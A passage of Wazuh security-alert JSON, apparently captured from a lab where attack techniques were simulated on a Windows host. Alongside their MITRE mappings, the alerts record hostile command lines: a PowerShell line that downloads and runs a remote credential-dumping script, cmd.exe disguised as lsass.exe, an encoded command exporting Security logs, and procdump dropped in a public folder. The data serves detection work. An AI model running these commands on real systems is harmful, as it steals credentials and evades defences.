+        }
+      },
+      "rule": {
+        "firedtimes": 1,
+        "mail": true,
+        "level": 12,
+        "description": "Command interpreter added to registry key associated to UAC bypass by auto-elevated processes",
+        "groups": [
+          "sysmon",
+          "sysmon_eid13_detections",
+          "windows"
+        ],
+        "mitre": {
+          "technique": [
+            "Bypass User Account Control",
+            "Modify Registry"
+          ],
+          "id": [
+            "T1548.002",
+            "T1112"
+          ],
+          "tactic": [
+            "Privilege Escalation",
+            "Defense Evasion"
+          ]
+        },
+        "id": "92305"
+      },
+      "location": "EventChannel",
+      "decoder": {
+        "name": "windows_eventchannel"
+      },
+      "id": "1757611185.1335881",
+      "timestamp": "2025-09-11T17:19:45.906+0000"
+    },
+    "fields": {
+      "timestamp": [
+        "2025-09-11T17:19:45.906Z"
+      ]
+    },
+    "sort": [
+      1757611185906
+    ]
+  },
+
+
+  {
+    "_index": "wazuh-alerts-4.x-2025.09.11",
+    "_id": "BkfIOZkBIDwfn7_zXarA",
+    "_score": null,
+    "_source": {
+      "input": {
+        "type": "log"
+      },
+      "agent": {
+        "ip": "192.168.1.101",
+        "name": "DESKTOP-MDNNEJF",
+        "id": "001"
+      },
+      "manager": {
+        "name": "ubuntu22"
+      },
+      "data": {
+        "win": {
+          "eventdata": {
+            "originalFileName": "PowerShell.EXE",
+            "image": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe",
+            "product": "Microsoft® Windows® Operating System",
+            "parentProcessGuid": "{994437b3-0426-68c3-7427-000000000e00}",
+            "description": "Windows PowerShell",
+            "logonGuid": "{994437b3-7451-68b8-95e0-070000000000}",
+            "parentCommandLine": "powershell.exe -ExecutionPolicy Bypass -C \\\"powershell -c {get-eventlog 'Security' | where {$_.Message -like '*SYSTEM*'} | export-csv $env:temp\\\\T1654_events.txt}\\\"",
+            "processGuid": "{994437b3-0426-68c3-7527-000000000e00}",
+            "logonId": "0x7e095",
+            "parentProcessId": "6980",
+            "processId": "4696",
+            "currentDirectory": "C:\\\\Windows\\\\system32\\\\",
+            "utcTime": "2025-09-11 17:17:26.873",
+            "hashes": "MD5=13CCCB79AAFFFB07C94E586B75817486,SHA256=529EE9D30EEF7E331B24E66D68205AB4554B6EB3487193D53ED3A840CA7DDE5D,IMPHASH=BF7A6E7A62C3F5B2E8E069438AC1DD3D",
+            "parentImage": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe",
+            "company": "Microsoft Corporation",
+            "commandLine": "\\\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\\\" -encodedCommand ZwBlAHQALQBlAHYAZQBuAHQAbABvAGcAIAAnAFMAZQBjAHUAcgBpAHQAeQAnACAAfAAgAHcAaABlAHIAZQAgAHsAJABfAC4ATQBlAHMAcwBhAGcAZQAgAC0AbABpAGsAZQAgACcAKgBTAFkAUwBUAEUATQAqACcAfQAgAHwAIABlAHgAcABvAHIAdAAtAGMAcwB2ACAAJABlAG4AdgA6AHQAZQBtAHAAXABUADEANgA1ADQAXwBlAHYAZQBuAHQAcwAuAHQAeAB0AA== -inputFormat xml -outputFormat text",
+            "integrityLevel": "High",
+            "fileVersion": "10.0.22621.1 (WinBuild.160101.0800)",
+            "user": "DESKTOP-MDNNEJF\\\\env-admin",
+            "terminalSessionId": "1",
+            "parentUser": "DESKTOP-MDNNEJF\\\\env-admin"
+          },
+          "system": {
+            "eventID": "1",
+            "keywords": "0x8000000000000000",
+            "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
+            "level": "4",
+            "channel": "Microsoft-Windows-Sysmon/Operational",
+            "opcode": "0",
+            "message": "\"Process Create:\r\nRuleName: -\r\nUtcTime: 2025-09-11 17:17:26.873\r\nProcessGuid: {994437b3-0426-68c3-7527-000000000e00}\r\nProcessId: 4696\r\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nFileVersion: 10.0.22621.1 (WinBuild.160101.0800)\r\nDescription: Windows PowerShell\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: PowerShell.EXE\r\nCommandLine: \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -encodedCommand ZwBlAHQALQBlAHYAZQBuAHQAbABvAGcAIAAnAFMAZQBjAHUAcgBpAHQAeQAnACAAfAAgAHcAaABlAHIAZQAgAHsAJABfAC4ATQBlAHMAcwBhAGcAZQAgAC0AbABpAGsAZQAgACcAKgBTAFkAUwBUAEUATQAqACcAfQAgAHwAIABlAHgAcABvAHIAdAAtAGMAcwB2ACAAJABlAG4AdgA6AHQAZQBtAHAAXABUADEANgA1ADQAXwBlAHYAZQBuAHQAcwAuAHQAeAB0AA== -inputFormat xml -outputFormat text\r\nCurrentDirectory: C:\\Windows\\system32\\\r\nUser: DESKTOP-MDNNEJF\\env-admin\r\nLogonGuid: {994437b3-7451-68b8-95e0-070000000000}\r\nLogonId: 0x7E095\r\nTerminalSessionId: 1\r\nIntegrityLevel: High\r\nHashes: MD5=13CCCB79AAFFFB07C94E586B75817486,SHA256=529EE9D30EEF7E331B24E66D68205AB4554B6EB3487193D53ED3A840CA7DDE5D,IMPHASH=BF7A6E7A62C3F5B2E8E069438AC1DD3D\r\nParentProcessGuid: {994437b3-0426-68c3-7427-000000000e00}\r\nParentProcessId: 6980\r\nParentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nParentCommandLine: powershell.exe -ExecutionPolicy Bypass -C \"powershell -c {get-eventlog 'Security' | where {$_.Message -like '*SYSTEM*'} | export-csv $env:temp\\T1654_events.txt}\"\r\nParentUser: DESKTOP-MDNNEJF\\env-admin\"",
+            "version": "5",
+            "systemTime": "2025-09-11T17:17:26.8756632Z",
+            "eventRecordID": "9822",
+            "threadID": "4804",
+            "computer": "DESKTOP-MDNNEJF",
+            "task": "1",
+            "processID": "3544",
+            "severityValue": "INFORMATION",
+            "providerName": "Microsoft-Windows-Sysmon"
+          }
+        }
+      },
+      "rule": {
+        "firedtimes": 1,
+        "mail": true,
+        "level": 12,
+        "description": "Powershell.exe spawned a powershell process which executed a base64 encoded command",
+        "groups": [
+          "sysmon",
+          "sysmon_eid1_detections",
+          "windows"
+        ],
+        "mitre": {
+          "technique": [
+            "PowerShell"
+          ],
+          "id": [
+            "T1059.001"
+          ],
+          "tactic": [
+            "Execution"
+          ]
+        },
+        "id": "92057"
+      },
+      "location": "EventChannel",
+      "decoder": {
+        "name": "windows_eventchannel"
+      },
+      "id": "1757611047.1222736",
+      "timestamp": "2025-09-11T17:17:27.599+0000"
+    },
+    "fields": {
+      "timestamp": [
+        "2025-09-11T17:17:27.599Z"
+      ]
+    },
+    "sort": [
+      1757611047599
+    ]
+  },
+
+
+
+  {
+    "_index": "wazuh-alerts-4.x-2025.09.11",
+    "_id": "-EfEOZkBIDwfn7_zxqn7",
+    "_score": null,
+    "_source": {
+      "input": {
+        "type": "log"
+      },
+      "agent": {
+        "ip": "192.168.1.101",
+        "name": "DESKTOP-MDNNEJF",
+        "id": "001"
+      },
+      "manager": {
+        "name": "ubuntu22"
+      },
+      "data": {
+        "win": {
+          "eventdata": {
+            "originalFileName": "csc.exe",
+            "image": "C:\\\\Windows\\\\Microsoft.NET\\\\Framework64\\\\v4.0.30319\\\\csc.exe",
+            "product": "Microsoft® .NET Framework",
+            "parentProcessGuid": "{994437b3-033d-68c3-6827-000000000e00}",
+            "description": "Visual C# Command Line Compiler",
+            "logonGuid": "{994437b3-7451-68b8-95e0-070000000000}",
+            "parentCommandLine": "powershell.exe -ExecutionPolicy Bypass -C \\\"IEX (IWR 'https://raw.githubusercontent.com/TriggerMan-S/Windows-Credential-Manager/4ad208e70c80dd2a9961db40793da291b1981e01/GetCredmanCreds.ps1' -UseBasicParsing); Get-CredManCreds -Force\\\"",
+            "processGuid": "{994437b3-033f-68c3-6927-000000000e00}",
+            "logonId": "0x7e095",
+            "parentProcessId": "3200",
+            "processId": "1444",
+            "currentDirectory": "C:\\\\Windows\\\\system32\\\\",
+            "utcTime": "2025-09-11 17:13:35.176",
+            "hashes": "MD5=0700180046633A40D24729AE8CACC158,SHA256=A725546BDE53F1AD533E74ABB01DD5ED5F07B171F5C284738DA88F6CE478CF5F,IMPHASH=2E6A9097FBA347A254DAC72662FE1259",
+            "parentImage": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe",
+            "company": "Microsoft Corporation",
+            "commandLine": "\\\"C:\\\\Windows\\\\Microsoft.NET\\\\Framework64\\\\v4.0.30319\\\\csc.exe\\\" /noconfig /fullpaths @\\\"C:\\\\Users\\\\env-admin\\\\AppData\\\\Local\\\\Temp\\\\1rjqb4p0\\\\1rjqb4p0.cmdline\\\"",
+            "integrityLevel": "High",
+            "fileVersion": "4.8.9032.0 built by: NET481REL1",
+            "user": "DESKTOP-MDNNEJF\\\\env-admin",
+            "terminalSessionId": "1",
+            "parentUser": "DESKTOP-MDNNEJF\\\\env-admin"
+          },
+          "system": {
+            "eventID": "1",
+            "keywords": "0x8000000000000000",
+            "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
+            "level": "4",
+            "channel": "Microsoft-Windows-Sysmon/Operational",
+            "opcode": "0",
+            "message": "\"Process Create:\r\nRuleName: -\r\nUtcTime: 2025-09-11 17:13:35.176\r\nProcessGuid: {994437b3-033f-68c3-6927-000000000e00}\r\nProcessId: 1444\r\nImage: C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe\r\nFileVersion: 4.8.9032.0 built by: NET481REL1\r\nDescription: Visual C# Command Line Compiler\r\nProduct: Microsoft® .NET Framework\r\nCompany: Microsoft Corporation\r\nOriginalFileName: csc.exe\r\nCommandLine: \"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe\" /noconfig /fullpaths @\"C:\\Users\\env-admin\\AppData\\Local\\Temp\\1rjqb4p0\\1rjqb4p0.cmdline\"\r\nCurrentDirectory: C:\\Windows\\system32\\\r\nUser: DESKTOP-MDNNEJF\\env-admin\r\nLogonGuid: {994437b3-7451-68b8-95e0-070000000000}\r\nLogonId: 0x7E095\r\nTerminalSessionId: 1\r\nIntegrityLevel: High\r\nHashes: MD5=0700180046633A40D24729AE8CACC158,SHA256=A725546BDE53F1AD533E74ABB01DD5ED5F07B171F5C284738DA88F6CE478CF5F,IMPHASH=2E6A9097FBA347A254DAC72662FE1259\r\nParentProcessGuid: {994437b3-033d-68c3-6827-000000000e00}\r\nParentProcessId: 3200\r\nParentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nParentCommandLine: powershell.exe -ExecutionPolicy Bypass -C \"IEX (IWR 'https://raw.githubusercontent.com/TriggerMan-S/Windows-Credential-Manager/4ad208e70c80dd2a9961db40793da291b1981e01/GetCredmanCreds.ps1' -UseBasicParsing); Get-CredManCreds -Force\"\r\nParentUser: DESKTOP-MDNNEJF\\env-admin\"",
+            "version": "5",
+            "systemTime": "2025-09-11T17:13:35.1784052Z",
+            "eventRecordID": "9801",
+            "threadID": "4804",
+            "computer": "DESKTOP-MDNNEJF",
+            "task": "1",
+            "processID": "3544",
+            "severityValue": "INFORMATION",
+            "providerName": "Microsoft-Windows-Sysmon"
+          }
+        }
+      },
+      "rule": {
+        "firedtimes": 2,
+        "mail": false,
+        "level": 6,
+        "description": "Powershell script compiling code using CSC.exe, possible malware drop",
+        "groups": [
+          "sysmon",
+          "sysmon_eid1_detections",
+          "windows"
+        ],
+        "mitre": {
+          "technique": [
+            "Compile After Delivery"
+          ],
+          "id": [
+            "T1027.004"
+          ],
+          "tactic": [
+            "Defense Evasion"
+          ]
+        },
+        "id": "92006"
+      },
+      "location": "EventChannel",
+      "decoder": {
+        "name": "windows_eventchannel"
+      },
+      "id": "1757610816.1173186",
+      "timestamp": "2025-09-11T17:13:36.211+0000"
+    },
+    "fields": {
+      "timestamp": [
+        "2025-09-11T17:13:36.211Z"
+      ]
+    },
+    "sort": [
+      1757610816211
+    ]
+  },
+
+
+
+  {
+    "_index": "wazuh-alerts-4.x-2025.09.11",
+    "_id": "7UfCOZkBIDwfn7_zQqlH",
+    "_score": null,
+    "_source": {
+      "input": {
+        "type": "log"
+      },
+      "agent": {
+        "ip": "192.168.1.101",
+        "name": "DESKTOP-MDNNEJF",
+        "id": "001"
+      },
+      "manager": {
+        "name": "ubuntu22"
+      },
+      "data": {
+        "win": {
+          "eventdata": {
+            "originalFileName": "Cmd.Exe",
+            "image": "C:\\\\Windows\\\\Temp\\\\lsass.exe",
+            "product": "Microsoft® Windows® Operating System",
+            "parentProcessGuid": "{994437b3-029c-68c3-5c27-000000000e00}",
+            "description": "Windows Command Processor",
+            "logonGuid": "{994437b3-7451-68b8-95e0-070000000000}",
+            "parentCommandLine": "cmd.exe /C copy %SystemRoot%\\\\System32\\\\cmd.exe %SystemRoot%\\\\Temp\\\\lsass.exe &amp;&amp; %SystemRoot%\\\\Temp\\\\lsass.exe /B",
+            "processGuid": "{994437b3-029c-68c3-5d27-000000000e00}",
+            "logonId": "0x7e095",
+            "parentProcessId": "11000",
+            "processId": "10652",
+            "currentDirectory": "C:\\\\Windows\\\\System32\\\\",
+            "utcTime": "2025-09-11 17:10:52.934",
+            "hashes": "MD5=791545E6E3C5EB61DD12CCFBAE1B9982,SHA256=B7EDC54E6B42CA1CDA290CE8CACFECAAC6DBCC8C14631BC20FB184A6309C1824,IMPHASH=D73E39DAB3C8B57AA408073D01254964",
+            "parentImage": "C:\\\\Windows\\\\System32\\\\cmd.exe",
+            "company": "Microsoft Corporation",
+            "commandLine": "C:\\\\Windows\\\\Temp\\\\lsass.exe  /B",
+            "integrityLevel": "High",
+            "fileVersion": "10.0.22621.608 (WinBuild.160101.0800)",
+            "user": "DESKTOP-MDNNEJF\\\\env-admin",
+            "terminalSessionId": "1",
+            "parentUser": "DESKTOP-MDNNEJF\\\\env-admin"
+          },
+          "system": {
+            "eventID": "1",
+            "keywords": "0x8000000000000000",
+            "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
+            "level": "4",
+            "channel": "Microsoft-Windows-Sysmon/Operational",
+            "opcode": "0",
+            "message": "\"Process Create:\r\nRuleName: -\r\nUtcTime: 2025-09-11 17:10:52.934\r\nProcessGuid: {994437b3-029c-68c3-5d27-000000000e00}\r\nProcessId: 10652\r\nImage: C:\\Windows\\Temp\\lsass.exe\r\nFileVersion: 10.0.22621.608 (WinBuild.160101.0800)\r\nDescription: Windows Command Processor\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: Cmd.Exe\r\nCommandLine: C:\\Windows\\Temp\\lsass.exe  /B\r\nCurrentDirectory: C:\\Windows\\System32\\\r\nUser: DESKTOP-MDNNEJF\\env-admin\r\nLogonGuid: {994437b3-7451-68b8-95e0-070000000000}\r\nLogonId: 0x7E095\r\nTerminalSessionId: 1\r\nIntegrityLevel: High\r\nHashes: MD5=791545E6E3C5EB61DD12CCFBAE1B9982,SHA256=B7EDC54E6B42CA1CDA290CE8CACFECAAC6DBCC8C14631BC20FB184A6309C1824,IMPHASH=D73E39DAB3C8B57AA408073D01254964\r\nParentProcessGuid: {994437b3-029c-68c3-5c27-000000000e00}\r\nParentProcessId: 11000\r\nParentImage: C:\\Windows\\System32\\cmd.exe\r\nParentCommandLine: cmd.exe /C copy %SystemRoot%\\System32\\cmd.exe %SystemRoot%\\Temp\\lsass.exe && %SystemRoot%\\Temp\\lsass.exe /B\r\nParentUser: DESKTOP-MDNNEJF\\env-admin\"",
+            "version": "5",
+            "systemTime": "2025-09-11T17:10:52.9469810Z",
+            "eventRecordID": "9790",
+            "threadID": "4804",
+            "computer": "DESKTOP-MDNNEJF",
+            "task": "1",
+            "processID": "3544",
+            "severityValue": "INFORMATION",
+            "providerName": "Microsoft-Windows-Sysmon"
+          }
+        }
+      },
+      "rule": {
+        "firedtimes": 1,
+        "mail": true,
+        "level": 12,
+        "pci_dss": [
+          "10.6.1",
+          "11.4"
+        ],
+        "hipaa": [
+          "164.312.b"
+        ],
+        "tsc": [
+          "CC7.2",
+          "CC7.3",
+          "CC6.1",
+          "CC6.8"
+        ],
+        "description": "Sysmon - Suspicious Process - lsass",
+        "groups": [
+          "windows",
+          "sysmon",
+          "sysmon_process-anomalies"
+        ],
+        "mitre": {
+          "technique": [
+            "Process Injection"
+          ],
+          "id": [
+            "T1055"
+          ],
+          "tactic": [
+            "Defense Evasion",
+            "Privilege Escalation"
+          ]
+        },
+        "id": "61625",
+        "nist_800_53": [
+          "AU.6",
+          "SI.4"
+        ],
+        "gdpr": [
+          "IV_35.7.d"
+        ]
+      },
+      "location": "EventChannel",
+      "decoder": {
+        "name": "windows_eventchannel"
+      },
+      "id": "1757610654.1112794",
+      "full_log": "{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-Sysmon\",\"providerGuid\":\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\",\"eventID\":\"1\",\"version\":\"5\",\"level\":\"4\",\"task\":\"1\",\"opcode\":\"0\",\"keywords\":\"0x8000000000000000\",\"systemTime\":\"2025-09-11T17:10:52.9469810Z\",\"eventRecordID\":\"9790\",\"processID\":\"3544\",\"threadID\":\"4804\",\"channel\":\"Microsoft-Windows-Sysmon/Operational\",\"computer\":\"DESKTOP-MDNNEJF\",\"severityValue\":\"INFORMATION\",\"message\":\"\\\"Process Create:\\r\\nRuleName: -\\r\\nUtcTime: 2025-09-11 17:10:52.934\\r\\nProcessGuid: {994437b3-029c-68c3-5d27-000000000e00}\\r\\nProcessId: 10652\\r\\nImage: C:\\\\Windows\\\\Temp\\\\lsass.exe\\r\\nFileVersion: 10.0.22621.608 (WinBuild.160101.0800)\\r\\nDescription: Windows Command Processor\\r\\nProduct: Microsoft® Windows® Operating System\\r\\nCompany: Microsoft Corporation\\r\\nOriginalFileName: Cmd.Exe\\r\\nCommandLine: C:\\\\Windows\\\\Temp\\\\lsass.exe  /B\\r\\nCurrentDirectory: C:\\\\Windows\\\\System32\\\\\\r\\nUser: DESKTOP-MDNNEJF\\\\env-admin\\r\\nLogonGuid: {994437b3-7451-68b8-95e0-070000000000}\\r\\nLogonId: 0x7E095\\r\\nTerminalSessionId: 1\\r\\nIntegrityLevel: High\\r\\nHashes: MD5=791545E6E3C5EB61DD12CCFBAE1B9982,SHA256=B7EDC54E6B42CA1CDA290CE8CACFECAAC6DBCC8C14631BC20FB184A6309C1824,IMPHASH=D73E39DAB3C8B57AA408073D01254964\\r\\nParentProcessGuid: {994437b3-029c-68c3-5c27-000000000e00}\\r\\nParentProcessId: 11000\\r\\nParentImage: C:\\\\Windows\\\\System32\\\\cmd.exe\\r\\nParentCommandLine: cmd.exe /C copy %SystemRoot%\\\\System32\\\\cmd.exe %SystemRoot%\\\\Temp\\\\lsass.exe && %SystemRoot%\\\\Temp\\\\lsass.exe /B\\r\\nParentUser: DESKTOP-MDNNEJF\\\\env-admin\\\"\"},\"eventdata\":{\"utcTime\":\"2025-09-11 17:10:52.934\",\"processGuid\":\"{994437b3-029c-68c3-5d27-000000000e00}\",\"processId\":\"10652\",\"image\":\"C:\\\\\\\\Windows\\\\\\\\Temp\\\\\\\\lsass.exe\",\"fileVersion\":\"10.0.22621.608 (WinBuild.160101.0800)\",\"description\":\"Windows Command Processor\",\"product\":\"Microsoft® Windows® Operating System\",\"company\":\"Microsoft Corporation\",\"originalFileName\":\"Cmd.Exe\",\"commandLine\":\"C:\\\\\\\\Windows\\\\\\\\Temp\\\\\\\\lsass.exe  /B\",\"currentDirectory\":\"C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\\",\"user\":\"DESKTOP-MDNNEJF\\\\\\\\env-admin\",\"logonGuid\":\"{994437b3-7451-68b8-95e0-070000000000}\",\"logonId\":\"0x7e095\",\"terminalSessionId\":\"1\",\"integrityLevel\":\"High\",\"hashes\":\"MD5=791545E6E3C5EB61DD12CCFBAE1B9982,SHA256=B7EDC54E6B42CA1CDA290CE8CACFECAAC6DBCC8C14631BC20FB184A6309C1824,IMPHASH=D73E39DAB3C8B57AA408073D01254964\",\"parentProcessGuid\":\"{994437b3-029c-68c3-5c27-000000000e00}\",\"parentProcessId\":\"11000\",\"parentImage\":\"C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\cmd.exe\",\"parentCommandLine\":\"cmd.exe /C copy %SystemRoot%\\\\\\\\System32\\\\\\\\cmd.exe %SystemRoot%\\\\\\\\Temp\\\\\\\\lsass.exe &amp;&amp; %SystemRoot%\\\\\\\\Temp\\\\\\\\lsass.exe /B\",\"parentUser\":\"DESKTOP-MDNNEJF\\\\\\\\env-admin\"}}}",
+      "timestamp": "2025-09-11T17:10:54.022+0000"
+    },
+    "fields": {
+      "timestamp": [
+        "2025-09-11T17:10:54.022Z"
+      ]
+    },
+    "sort": [
+      1757610654022
+    ]
+  },
+
+
+
+
+  {
+    "_index": "wazuh-alerts-4.x-2025.09.11",
+    "_id": "6kfBOZkBIDwfn7_zk6k8",
+    "_score": null,
+    "_source": {
+      "input": {
+        "type": "log"
+      },
+      "agent": {
+        "ip": "192.168.1.101",
+        "name": "DESKTOP-MDNNEJF",
+        "id": "001"
+      },
+      "manager": {
+        "name": "ubuntu22"
+      },
+      "data": {
+        "win": {
+          "eventdata": {
+            "image": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe",
+            "processGuid": "{994437b3-0268-68c3-5527-000000000e00}",
+            "processId": "9064",
+            "utcTime": "2025-09-11 17:10:08.309",
+            "targetFilename": "C:\\\\Users\\\\Public\\\\temp\\\\procdump64a.exe",
+            "ruleName": "EXE",
+            "creationUtcTime": "2025-09-11 17:10:08.309",
+            "user": "DESKTOP-MDNNEJF\\\\env-admin"
+          },
+          "system": {
+            "eventID": "11",
+            "keywords": "0x8000000000000000",
+            "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
+            "level": "4",
+            "channel": "Microsoft-Windows-Sysmon/Operational",
+            "opcode": "0",
+            "message": "\"File created:\r\nRuleName: EXE\r\nUtcTime: 2025-09-11 17:10:08.309\r\nProcessGuid: {994437b3-0268-68c3-5527-000000000e00}\r\nProcessId: 9064\r\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nTargetFilename: C:\\Users\\Public\\temp\\procdump64a.exe\r\nCreationUtcTime: 2025-09-11 17:10:08.309\r\nUser: DESKTOP-MDNNEJF\\env-admin\"",
+            "version": "2",
+            "systemTime": "2025-09-11T17:10:08.3103718Z",
+            "eventRecordID": "9782",
+            "threadID": "4804",
+            "computer": "DESKTOP-MDNNEJF",
+            "task": "11",
+            "processID": "3544",
+            "severityValue": "INFORMATION",
+            "providerName": "Microsoft-Windows-Sysmon"
+          }
+        }
+      },
+      "rule": {
+        "firedtimes": 3,
+        "mail": true,
+        "level": 12,
+        "description": "Executable file dropped in Users\\Public folder",
+        "groups": [
+          "sysmon",
+          "sysmon_eid11_detections",
+          "windows"
+        ],
+        "mitre": {
+          "technique": [
+            "Ingress Tool Transfer"
+          ],
+          "id": [
+            "T1105"
+          ],
+          "tactic": [
+            "Command and Control"
+          ]
+        },
+        "id": "92207"
+      },
+      "location": "EventChannel",
+      "decoder": {
+        "name": "windows_eventchannel"
+      },
+      "id": "1757610608.1101539",
+      "timestamp": "2025-09-11T17:10:08.961+0000"
+    },
+    "fields": {
+      "timestamp": [
+        "2025-09-11T17:10:08.961Z"
+      ]
+    },
+    "sort": [
+      1757610608961
+    ]
+  },
+
+
+
+  {
+    "_index": "wazuh-alerts-4.x-2025.09.11",
+    "_id": "n0eUOZkBIDwfn7_zL6ll",
+    "_score": null,
+    "_source": {
+      "input": {
+        "type": "log"
+      },
+      "agent": {
+        "ip": "192.168.1.101",
+        "name": "DESKTOP-MDNNEJF",
+        "id": "001"
+      },
+      "manager": {
+        "name": "ubuntu22"
+      },
+      "data": {
+        "win": {
+          "eventdata": {
+            "image": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe",
+            "processGuid": "{994437b3-f6d1-68c2-1827-000000000e00}",
+            "processId": "5440",
+            "utcTime": "2025-09-11 16:20:33.527",
+            "targetFilename": "C:\\\\Users\\\\env-admin\\\\AppData\\\\Local\\\\Microsoft\\\\CLR_v4.0\\\\UsageLogs\\\\powershell.exe.log",
+            "ruleName": "ProcessHostingdotNETCode",
+            "creationUtcTime": "2025-09-02 04:28:13.769",
+            "user": "DESKTOP-MDNNEJF\\\\env-admin"
+          },
+          "system": {
+            "eventID": "11",
+            "keywords": "0x8000000000000000",
+            "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
+            "level": "4",
+            "channel": "Microsoft-Windows-Sysmon/Operational",
+            "opcode": "0",
+            "message": "\"File created:\r\nRuleName: ProcessHostingdotNETCode\r\nUtcTime: 2025-09-11 16:20:33.527\r\nProcessGuid: {994437b3-f6d1-68c2-1827-000000000e00}\r\nProcessId: 5440\r\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nTargetFilename: C:\\Users\\env-admin\\AppData\\Local\\Microsoft\\CLR_v4.0\\UsageLogs\\powershell.exe.log\r\nCreationUtcTime: 2025-09-02 04:28:13.769\r\nUser: DESKTOP-MDNNEJF\\env-admin\"",
+            "version": "2",
+            "systemTime": "2025-09-11T16:20:33.5300135Z",
+            "eventRecordID": "9695",
+            "threadID": "4804",
+            "computer": "DESKTOP-MDNNEJF",
+            "task": "11",
+            "processID": "3544",
+            "severityValue": "INFORMATION",
+            "providerName": "Microsoft-Windows-Sysmon"
+          }
+        }
+      },
+      "rule": {
+        "firedtimes": 1,
+        "mail": false,
+        "level": 9,
+        "description": "Powershell process created executable file in AppData temp folder",
+        "groups": [
+          "sysmon",
+          "sysmon_eid11_detections",
+          "windows"
+        ],
+        "mitre": {
+          "technique": [
+            "Ingress Tool Transfer"
+          ],
+          "id": [
+            "T1105"
+          ],
+          "tactic": [
+            "Command and Control"
+          ]
+        },
+        "id": "92204"
+      },
+      "location": "EventChannel",
+      "decoder": {
+        "name": "windows_eventchannel"
+      },
+      "id": "1757607634.840437",
+      "timestamp": "2025-09-11T16:20:34.141+0000"
+    },
+    "fields": {
+      "timestamp": [
+        "2025-09-11T16:20:34.141Z"
+      ]
+    },
+    "sort": [
+      1757607634141
+    ]
+  },
+
+
+  {
+    "_index": "wazuh-alerts-4.x-2025.09.11",
+    "_id": "hUd5OZkBIDwfn7_zPKmn",
+    "_score": null,
+    "_source": {
+      "input": {
+        "type": "log"
+      },
+      "agent": {
+        "ip": "192.168.1.101",
+        "name": "DESKTOP-MDNNEJF",
+        "id": "001"
+      },
+      "manager": {
+        "name": "ubuntu22"
+      },
+      "data": {
+        "win": {
+          "eventdata": {
+            "data": "hr=0x803F7001, RuleId=31e71c49-8da7-4a2f-ad92-45d98a1c79ba;Action=AutoActivate;AppId=55c92734-d682-4d71-983e-d6ec3f16059f;SkuId=62f0c100-9c53-4e02-b886-a3528ddfe7f6;NotificationInterval=1440;Trigger=TimerEvent"
+          },
+          "system": {
+            "eventID": "8198",
+            "eventSourceName": "Software Protection Platform Service",
+            "keywords": "0x80000000000000",
+            "providerGuid": "{E23B33B0-C8C9-472C-A5F9-F2BDFEA0F156}",
+            "level": "2",
+            "channel": "Application",
+            "opcode": "0",
+            "message": "\"Échec de l’activation des licences (slui.exe) avec le code d’erreur suivant :\r\nhr=0x803F7001\r\nArguments de la ligne de commande :\r\nRuleId=31e71c49-8da7-4a2f-ad92-45d98a1c79ba;Action=AutoActivate;AppId=55c92734-d682-4d71-983e-d6ec3f16059f;SkuId=62f0c100-9c53-4e02-b886-a3528ddfe7f6;NotificationInterval=1440;Trigger=TimerEvent\"",
+            "version": "0",
+            "systemTime": "2025-09-11T15:51:01.9444510Z",
+            "eventRecordID": "7246",
+            "threadID": "0",
+            "computer": "DESKTOP-MDNNEJF",
+            "task": "0",
+            "processID": "8120",
+            "severityValue": "ERROR",
+            "providerName": "Microsoft-Windows-Security-SPP"
+          }
+        }
+      },
+      "rule": {
+        "firedtimes": 1,
+        "mail": false,
+        "level": 5,
+        "description": "License activation (slui.exe) failed.",
+        "groups": [
+          "windows",
+          "windows_application"
+        ],
+        "id": "60646"
+      },
+      "location": "EventChannel",
+      "decoder": {
+        "name": "windows_eventchannel"
+      },
+      "id": "1757605861.812840",
+      "timestamp": "2025-09-11T15:51:01.913+0000"
+    },
+    "fields": {
+      "timestamp": [
+        "2025-09-11T15:51:01.913Z"
+      ]
+    },
+    "sort": [
+      1757605861913
+    ]
+  },
+
+
+  {
+    "_index": "wazuh-alerts-4.x-2025.09.11",
+    "_id": "lEf0OZkBIDwfn7_zJ6p_",
+    "_score": null,
+    "_source": {
+      "syscheck": {
+        "mode": "scheduled",
+        "path": "HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft",
+        "changed_attributes": [
+          "mtime"
+        ],
+        "uname_after": "SYSTEM",
+        "gname_after": "SYSTEM",
+        "mtime_after": "2025-09-11T17:29:33",
+        "uid_after": "S-1-5-18",
+        "gid_after": "S-1-5-18",
+        "arch": "[x32]",
+        "win_perm_after": [
+          {
+            "allowed": [
+              "GENERIC_READ",
+              "READ_CONTROL",
+              "READ_DATA",
+              "READ_EA",
+              "WRITE_EA",
+              [
+                "GENERIC_ALL",
+                "DELETE",
+                "READ_CONTROL",
+                "WRITE_DAC",
+                "WRITE_OWNER",
+                "READ_DATA",
+                "WRITE_DATA",
+                "APPEND_DATA",
+                "READ_EA",
+                "WRITE_EA",
+                "EXECUTE"
